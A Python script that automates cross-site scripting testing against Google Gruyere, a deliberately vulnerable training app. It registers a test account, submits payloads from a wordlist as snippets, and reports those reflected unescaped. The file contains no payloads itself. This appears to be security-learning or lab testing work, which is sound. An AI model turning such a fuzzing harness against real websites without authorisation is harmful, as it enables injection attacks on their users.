import requests
import urllib.parse

from tqdm import tqdm
from bs4 import BeautifulSoup as bs


class XSSPayloader:

    def __init__(self, username="test", password="test",
                    wordlist_path="payloads.lst", delete_payloads=True):
        self.username = username
        self.password = password
        self.wordlist_path = wordlist_path
        self.delete_payloads = delete_payloads

        self.gruyere_url = "https://google-gruyere.appspot.com"

        self.init_session()
        self.init_gruyere()
        self.init_login()
        self.init_payloads()


    def init_session(self):
        self.s = requests.Session()


    def init_gruyere(self):
        resp = self.s.get(self.gruyere_url + "/start")
        soup = bs(resp.text, 'html.parser')
        link = soup.find_all("a")[-1]["href"]
        self.gruyere_id_url = self.gruyere_url + link
        self.login_url = self.gruyere_id_url + "/login?uid={}&pw={}"
        self.signup_url = self.gruyere_id_url + "/saveprofile?action=new&uid={}&pw={}&is_author=True"
        self.snippet_url = self.gruyere_id_url + "/newsnippet2?snippet={}"
        self.snippet_delete_url = self.gruyere_id_url + "/deletesnippet?index=0"


    def init_login(self):
        resp = self.s.get(self.signup_url.format(self.username, self.password))
        resp = self.s.get(self.login_url.format(self.username, self.password))


    def init_payloads(self):
        with open(self.wordlist_path, "r") as f:
            self.payloads = f.readlines()


    def bruteforce(self):
        self.tested_payloads = []
        self.successful_payloads = []
        for payload in tqdm(self.payloads):
            payload = payload.strip()
            url_payload = urllib.parse.quote_plus(payload.strip())


            if payload != "" and payload not in self.tested_payloads:
                resp = self.s.get(self.snippet_url.format(url_payload))

                if payload in resp.text:
                    self.successful_payloads.append(payload)

                if self.delete_payloads:
                    resp = self.s.get(self.snippet_delete_url)

                self.tested_payloads.append(payload)


    def report(self):
        if len(self.successful_payloads) > 0:
            print("Successful payloads:")
            for payload in self.successful_payloads:
                print(payload)

        else:
            print("No successful payloads.")


if __name__ == "__main__":
    payloader = XSSPayloader()
    try:
        payloader.bruteforce()
    except Exception as e:
        print(e)
        input()
    payloader.report()
